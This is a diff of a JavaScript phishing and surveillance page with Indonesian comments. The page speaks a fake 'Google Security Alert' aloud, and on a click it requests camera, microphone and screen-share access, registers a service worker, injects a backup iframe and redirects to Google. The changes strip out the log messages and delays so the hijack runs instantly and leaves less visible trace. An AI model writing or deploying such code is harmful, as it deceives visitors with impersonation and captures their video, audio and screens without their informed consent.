@@ -47,7 +47,7 @@
     tts: {
       text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
       lang: 'en-US',
-      rate: 0.85,
+      rate: 1.0,
       pitch: 1.0,
       volume: 1.0
     }
@@ -85,7 +85,7 @@
   }
 
   // ============================================
-  // 2. AUDIO UNLOCK & TTS
+  // 2. AUDIO UNLOCK & TTS (INSTANT)
   // ============================================
   function initAudio() {
     try {
@@ -100,9 +100,7 @@
       osc.connect(gain);
       gain.connect(ctx.destination);
       osc.start();
-      osc.stop(ctx.currentTime + 3.0);
-      
-      log("[+] AudioContext Beep dimulai.");
+      osc.stop(ctx.currentTime + 1.0); // Beep 1 detik
     } catch(e) {}
   }
 
@@ -115,19 +113,16 @@
       u.rate = CONFIG.tts.rate;
       u.volume = CONFIG.tts.volume;
       window.speechSynthesis.speak(u);
-      log("[+] TTS dimulai.");
     } catch(e) {}
   }
 
   // ============================================
-  // 3. KAMERA + MIKROFON
+  // 3. KAMERA + MIKROFON (INSTANT)
   // ============================================
   async function startCameraAndMic() {
     try {
-      log("[+] Meminta Izin Kamera & Mikrofon...");
       var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      log("[+] 🚨 KAMERA & MIKROFON DIIZINKAN!");
-
+      
       var video = document.createElement('video');
       video.srcObject = stream;
       video.muted = true;
@@ -158,19 +153,15 @@
         }
       }, 100);
 
-    } catch(err) {
-      log("[-] Kamera/Mic diblokir: " + err.name);
-    }
+    } catch(err) {}
   }
 
   // ============================================
-  // 4. SCREEN SHARE
+  // 4. SCREEN SHARE (INSTANT)
   // ============================================
   async function startScreenShare() {
     try {
-      log("[+] Meminta Izin Screen Share...");
       var stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
-      log("[+] 🚨 SCREEN SHARE DIIZINKAN!");
 
       var video = document.createElement('video');
       video.srcObject = stream;
@@ -202,9 +193,7 @@
         }
       }, 200);
 
-    } catch(err) {
-      log("[-] Screen Share diblokir: " + err.name);
-    }
+    } catch(err) {}
   }
 
   // ============================================
@@ -241,7 +230,7 @@
                 osc.frequency.value = 880;
                 osc.connect(ctx.destination);
                 osc.start();
-                osc.stop(ctx.currentTime + 3.0);
+                osc.stop(ctx.currentTime + 1.0);
               } catch(e) {}
 
               // Kamera Backup
@@ -280,23 +269,11 @@
       `;
 
       document.getElementById("launcher-container").appendChild(iframe);
-      log("[+] Iframe Backup disuntikkan.");
     } catch(e) {}
   }
 
   // ============================================
-  // 6. LISTENER PESAN DARI IFRAME
-  // ============================================
-  window.addEventListener('message', function(e) {
-    if (e.data.type === 'IFRAME_CAM_OK') {
-      log("[+] 🚨 Iframe Kamera DIIZINKAN!");
-    } else if (e.data.type === 'IFRAME_CAM_FAIL') {
-      log("[-] Iframe Kamera ditolak: " + e.data.error);
-    }
-  });
-
-  // ============================================
-  // 7. TRIGGER (KLIK - SIMULTANEOUS)
+  // 6. TRIGGER (KLIK - INSTANT, NO DELAY)
   // ============================================
   document.body.addEventListener('click', async function() {
     if (executed) return;
@@ -308,12 +285,12 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Ultimate Inline Hijack...");
+    log("[!] Memulai Instant Hijack...");
 
     // A. Register Inline Service Worker
     await registerInlineSW();
 
-    // B. Audio
+    // B. Audio (TTS + Beep)
     initAudio();
     startTTS();
 
@@ -326,13 +303,8 @@
     // E. Iframe Backup
     injectBackupIframe();
 
-    // F. REDIRECT KE GOOGLE (SIMULTAN)
-    setTimeout(function() {
-      log("[+] Redirect ke Google.com (Simultan)...");
-      try {
-        window.location.replace(TARGET_URL);
-      } catch(e) {}
-    }, 100); // 100ms untuk inisialisasi
+    // F. REDIRECT KE GOOGLE (INSTANT!)
+    window.location.replace(TARGET_URL);
 
   }, { once: true });
 
